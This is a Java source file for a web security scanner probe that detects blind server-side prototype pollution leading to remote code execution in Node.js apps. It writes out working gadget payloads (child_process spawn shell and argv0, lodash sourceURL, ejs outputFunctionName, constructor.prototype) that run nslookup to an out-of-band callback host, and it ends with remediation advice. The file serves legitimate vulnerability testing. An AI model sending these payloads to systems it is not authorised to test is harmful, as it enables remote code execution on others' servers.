package com.burpmax.active;

import java.util.*;
import static com.burpmax.model.Finding.*;

/**
 * OOB blind server-side prototype pollution → RCE probe.
 *
 * The existing PrototypePollutionProbe detects pollution by checking whether
 * a canary property appears in subsequent responses — this only works when
 * the polluted property is reflected somewhere in the output.
 *
 * Many Node.js applications do NOT reflect arbitrary properties, but a polluted
 * prototype can still lead to RCE if the application uses a gadget that executes
 * the polluted value as a command. Known gadget chains:
 *
 *   child_process.spawn / exec gadget (most common):
 *     Pollute: {"__proto__":{"shell":"/proc/self/exe","argv0":"require('child_process')
 *               .exec('nslookup HOST')"}}
 *     Triggers when any spawn() call is made after pollution.
 *
 *   lodash.template gadget:
 *     Pollute: {"__proto__":{"sourceURL":"\\u000anslookup HOST//"}}
 *     Triggers when lodash.template() compiles any template string.
 *
 *   Node.js vm.runInNewContext / require gadget:
 *     Pollute: {"__proto__":{"NODE_OPTIONS":"--require /proc/self/cmdline"}}
 *     Limited applicability but high impact if triggered.
 *
 *   ejs template gadget (CVE-2022-29078):
 *     Pollute: {"__proto__":{"outputFunctionName":"x; process.mainModule.require(
 *               'child_process').exec('nslookup HOST'); x"}}
 *     Triggers when ejs renders any template.
 *
 * All payloads use nslookup/curl to the OOB host as the injected command —
 * confirming code execution without causing destruction on the target.
 *
 * This probe only makes sense for JSON body endpoints (application/json)
 * since it needs to inject deeply nested objects. Form-encoded endpoints
 * are also tested using bracket notation (__proto__[shell]=...).
 */
public class BlindPrototypePollutionProbe {

    // Gadget payload templates — HOST replaced at runtime
    // Each entry: [JSON path key, JSON value template, gadget name]
    private static final List<String[]> GADGET_PAYLOADS = List.of(

        // child_process.spawn shell gadget (broadest coverage)
        new String[]{
            "__proto__",
            "{\"shell\":\"/proc/self/exe\",\"argv0\":\"require('child_process').exec('nslookup HOST')\"}",
            "spawn-shell"
        },

        // lodash.template sourceURL gadget
        new String[]{
            "__proto__",
            "{\"sourceURL\":\"\\u000anslookup HOST//\"}",
            "lodash-template"
        },

        // ejs outputFunctionName gadget (CVE-2022-29078)
        new String[]{
            "__proto__",
            "{\"outputFunctionName\":\"x;require('child_process').exec('nslookup HOST');x\"}",
            "ejs-template"
        },

        // constructor.prototype variant (some sanitisers block __proto__ but not constructor)
        new String[]{
            "constructor",
            "{\"prototype\":{\"shell\":\"/proc/self/exe\",\"argv0\":\"require('child_process').exec('nslookup HOST')\"}}",
            "constructor-spawn"
        }
    );

    // URL/form parameter pollution gadget templates
    // Used for non-JSON endpoints
    private static final List<String[]> PARAM_GADGETS = List.of(
        new String[]{"__proto__[shell]",    "/proc/self/exe",                           "param-shell"},
        new String[]{"__proto__[argv0]",    "require('child_process').exec('nslookup HOST')", "param-argv0"},
        new String[]{"__proto__[sourceURL]","\\u000anslookup HOST//",                   "param-sourceURL"}
    );

    // ── Main entry point ──────────────────────────────────────────────────────
    public static List<ActiveScanResult> probe(ProbeContext ctx,
                                               RequestBuilder rb,
                                               HttpSender sender,
                                               OobClient oob) {
        if (oob == null || !oob.isAvailable()) return List.of();

        List<ActiveScanResult> results = new ArrayList<>();
        String ctLower = ctx.contentType != null ? ctx.contentType.toLowerCase() : "";

        // ── 1. JSON body gadget injection ─────────────────────────────────
        if (ctLower.contains("application/json")) {
            String oobHost = oob.generateHost("pp-json-" + ctx.host);
            if (oobHost != null) {
                for (String[] gadget : GADGET_PAYLOADS) {
                    String value = gadget[1].replace("HOST", oobHost);
                    byte[] req = rb.buildProbeRequest(ctx, gadget[0], value);
                    if (req == null) continue;
                    // Record before sending — callback must match even if response is null.
                    oob.recordInjection(oobHost,
                            "Prototype Pollution → RCE (Blind OOB) [" + gadget[2] + "]",
                            ctx.url, gadget[0], value);
                    sender.send(ctx.service, req);  // fire-and-forget
                }
            }
        }

        // ── 2. URL/form parameter gadget injection ────────────────────────
        String oobHost2 = oob.generateHost("pp-param-" + ctx.host);
        if (oobHost2 != null) {
            // Inject shell and argv0 together (both needed for the gadget to fire)
            String shellPayload = "/proc/self/exe";
            String argv0Payload = "require('child_process').exec('nslookup " + oobHost2 + "')";

            byte[] reqShell = rb.buildProbeRequest(ctx, "__proto__[shell]", shellPayload);
            byte[] reqArgv0 = rb.buildProbeRequest(ctx, "__proto__[argv0]", argv0Payload);
            // Record argv0 before sending (shell is just context, argv0 carries the command)
            if (reqArgv0 != null) {
                oob.recordInjection(oobHost2,
                        "Prototype Pollution → RCE (Blind OOB) [param-spawn]",
                        ctx.url, "__proto__[argv0]", argv0Payload, reqArgv0);
            }
            if (reqShell != null) sender.send(ctx.service, reqShell);
            if (reqArgv0 != null) sender.send(ctx.service, reqArgv0);

            // sourceURL gadget (lodash)
            String srcPayload = "\\u000anslookup " + oobHost2 + "//";
            byte[] reqSrc = rb.buildProbeRequest(ctx, "__proto__[sourceURL]", srcPayload);
            if (reqSrc != null) {
                oob.recordInjection(oobHost2,
                        "Prototype Pollution → RCE (Blind OOB) [param-sourceURL]",
                        ctx.url, "__proto__[sourceURL]", srcPayload, reqSrc);
                sender.send(ctx.service, reqSrc);
            }
        }

        return results;
    }

    // ── Finding builder ───────────────────────────────────────────────────────
    public static ActiveScanResult buildFinding(OobClient.OobHit hit) {
        String gadget = "unknown";
        int lb = hit.probeName().lastIndexOf('[');
        int rb2 = hit.probeName().lastIndexOf(']');
        if (lb >= 0 && rb2 > lb) gadget = hit.probeName().substring(lb + 1, rb2);

        return new ActiveScanResult(
            "Server-Side Prototype Pollution → RCE (Blind OOB)", SEV_CRITICAL,
            "Blind prototype pollution with confirmed RCE was detected via an out-of-band " +
            hit.interactionType() + " callback. The '" + gadget + "' gadget payload injected " +
            "into '" + hit.parameter() + "' caused a system command to execute and make an " +
            "outbound connection to the OOB host (" + hit.interactionDetail() + "). " +
            "This confirms: (1) prototype pollution is possible, (2) a code execution gadget " +
            "is present in the application's dependency tree, and (3) the polluted property " +
            "was evaluated by that gadget - full Remote Code Execution. " +
            "Common affected libraries: lodash < 4.17.21, ejs < 3.1.7, " +
            "defaults, merge, extend, deep-assign.",
            "OOB callback: " + hit.interactionDetail() +
            " | Gadget: " + gadget +
            " | Parameter: " + hit.parameter() +
            " | Payload: " + trunc(hit.payload(), 100),
            "PRIMARY FIX: Object.freeze(Object.prototype) early in application startup.\n" +
            "Reject __proto__, constructor, and prototype keys before any merge/assign.\n" +
            "Use Object.create(null) for all hash maps and property bags.\n\n" +
            "MANDATORY DEPENDENCY UPDATES:\n" +
            "- lodash >= 4.17.21, ejs >= 3.1.7 (CVE-2022-29078 RCE gadget)\n" +
            "- defaults >= 1.0.4, merge >= 2.1.1, deep-assign >= 3.0.0\n\n" +
            "NODE.JS FLAGS: --disable-proto=delete or --disable-proto=throw (Node 12.17+).\n" +
            "Run npm audit immediately and remediate all prototype pollution CVEs.",
            "CWE-1321",
            hit.endpoint(), hit.parameter(), hit.payload(), "", hit.interactionDetail());
    }

    private static String trunc(String s, int n) {
        return s == null ? "" : s.length() > n ? s.substring(0, n) + "..." : s;
    }
}
